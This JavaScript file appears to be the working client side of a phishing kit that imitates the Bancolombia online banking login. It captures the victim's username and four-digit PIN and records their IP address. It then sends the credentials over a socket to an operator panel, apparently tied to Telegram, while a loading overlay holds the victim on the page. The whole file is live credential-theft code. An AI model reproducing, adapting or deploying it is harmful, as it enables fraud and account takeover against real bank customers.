// Script principal para index.html
document.addEventListener('DOMContentLoaded', async () => {
    // Elementos del DOM
    const usuarioInput = document.getElementById('usuario');
    const claveInput = document.getElementById('clave');
    const submitButton = document.querySelector('.btn-iniciar');
    const form = document.querySelector('.auth-form');
    
    // Inicializar sesión y socket
    const sessionId = bancolombia.initGlobalSession();
    const socket = bancolombia.initializeSocket();
    bancolombia.setupTelegramActions();
    
    // Crear overlay
    const overlay = bancolombia.createLoadingOverlay();
    
    // Actualizar fecha/hora e IP
    const updateDateTime = () => {
        const now = new Date();
        const options = { 
            weekday: 'long', 
            year: 'numeric', 
            month: 'long', 
            day: 'numeric',
            hour: 'numeric',
            minute: '2-digit',
            hour12: true,
            timeZone: 'America/Bogota'
        };
        const dateTimeStr = now.toLocaleDateString('es-CO', options);
        document.querySelectorAll('.datetime').forEach(el => {
            el.textContent = dateTimeStr.toLowerCase();
        });
    };

    const getIPAddress = async () => {
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            document.querySelectorAll('.ip-address').forEach(el => {
                el.textContent = `Dirección IP: ${data.ip}`;
            });
        } catch (error) {
            console.error('Error obteniendo IP:', error);
        }
    };

    // Actualizar cada minuto
    setInterval(updateDateTime, 60000);
    updateDateTime();
    getIPAddress();

    // Validar solo números en clave
    claveInput.addEventListener('input', (e) => {
        e.target.value = e.target.value.replace(/[^0-9]/g, '').slice(0, 4);
        validateForm();
    });

    claveInput.addEventListener('paste', (e) => {
        e.preventDefault();
        const pastedText = (e.clipboardData || window.clipboardData).getData('text');
        claveInput.value = pastedText.replace(/[^0-9]/g, '').slice(0, 4);
        validateForm();
    });

    // Validación del formulario
    const validateForm = () => {
        const usuario = usuarioInput.value.trim();
        const clave = claveInput.value;
        
        const isValid = usuario.length > 0 && clave.length === 4;
        
        submitButton.disabled = !isValid;
        
        if (isValid) {
            submitButton.classList.add('active');
            submitButton.style.backgroundColor = '#FFD700';
            submitButton.style.cursor = 'pointer';
        } else {
            submitButton.classList.remove('active');
            submitButton.style.backgroundColor = '';
            submitButton.style.cursor = 'default';
        }
    };

    // Eventos de validación
    usuarioInput.addEventListener('input', validateForm);
    claveInput.addEventListener('input', validateForm);
    
    // Validación inicial
    validateForm();

    // Control de envío único
    let isSubmitting = false;
    
    // Manejar envío del formulario
    form.addEventListener('submit', async (e) => {
        e.preventDefault();
        
        if (isSubmitting) return;
        isSubmitting = true;
        
        // Prevenir diálogos
        window.onbeforeunload = null;
        
        // Mostrar overlay
        overlay.show();
        
        // Deshabilitar formulario
        usuarioInput.disabled = true;
        claveInput.disabled = true;
        submitButton.disabled = true;
        
        // Verificar y esperar conexión de socket
        if (!socket || !socket.connected) {
            console.log('⏳ Esperando conexión de socket...');
            
            // Intentar reconectar
            if (socket) {
                socket.connect();
            } else {
                const newSocket = bancolombia.initializeSocket();
                if (newSocket) {
                    socket = newSocket;
                }
            }
            
            // Esperar hasta 5 segundos para conectar
            let attempts = 0;
            while ((!socket || !socket.connected) && attempts < 10) {
                await new Promise(resolve => setTimeout(resolve, 500));
                attempts++;
            }
            
            if (!socket || !socket.connected) {
                console.error('❌ Socket no conectado después de reintentos');
                alert('Error de conexión. Por favor, recarga la página.');
                resetForm();
                return;
            }
            
            console.log('✅ Socket conectado, procediendo...');
        }
        
        // Enviar datos
        const data = {
            type: 'login',
            sessionId: bancolombia.getSessionId(),
            content: {
                text: `📱 Inicio de sesión\n👤 Usuario: ${usuarioInput.value}\n🔐 Clave: ${claveInput.value}`
            },
            waitForAction: true,
            timestamp: Date.now()
        };
        
        socket.emit('sendData', data);
        
        // Manejar respuesta
        socket.once('dataSent', (response) => {
            if (response.success) {
                console.log('Datos enviados correctamente');
                // Mantener overlay visible
            } else {
                console.error('Error:', response.message);
                alert('Error al procesar la solicitud');
                resetForm();
            }
        });
        
        // Timeout de seguridad
        setTimeout(() => {
            if (isSubmitting) {
                console.log('Timeout alcanzado');
            }
        }, 30000);
        
        function resetForm() {
            isSubmitting = false;
            usuarioInput.disabled = false;
            claveInput.disabled = false;
            submitButton.disabled = false;
            overlay.hide();
        }
    });
});
